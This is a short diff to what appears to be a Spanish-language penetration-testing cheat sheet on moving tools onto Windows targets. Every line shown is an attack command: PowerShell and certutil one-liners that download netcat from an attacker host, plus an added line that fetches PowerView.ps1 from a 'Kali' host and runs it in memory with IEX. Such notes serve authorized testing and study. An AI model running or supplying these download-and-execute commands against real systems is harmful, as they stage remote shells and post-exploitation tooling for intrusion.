@@ -66,6 +66,7 @@ EXTRA:
    ❯ powershell -c "IWR http://<IP>/nc.exe -OutFile nc.exe"
    ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','nc.exe')"
    # PowerShell → varias alternativas si una falla
+   ❯ IEX (New-Object Net.WebClient).DownloadString('http://Kali/PowerView.ps1')
 
 2  ❯ certutil -urlcache -f http://<IP>/nc.exe C:\Users\Public\nc.exe
    ❯ certutil.exe -f -urlcache -split http://<IP>/nc.exe C:\Users\Public\nc.exe
